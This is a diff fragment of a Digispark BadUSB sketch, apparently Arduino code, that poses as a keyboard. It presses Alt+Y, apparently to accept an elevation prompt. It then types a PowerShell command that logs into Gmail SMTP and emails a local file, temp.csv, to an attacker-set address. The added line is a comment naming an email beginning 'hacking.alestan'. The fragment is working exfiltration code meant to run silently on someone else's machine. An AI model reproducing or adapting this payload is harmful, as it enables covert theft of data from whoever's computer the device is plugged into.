@@ -21,6 +21,7 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
+  // email hacking.alestan@...
   DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'SENHA'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'EMAIL_ENVIO'; $ReportEmail.To.Add('EMAIL_RECEBE'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = ' your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
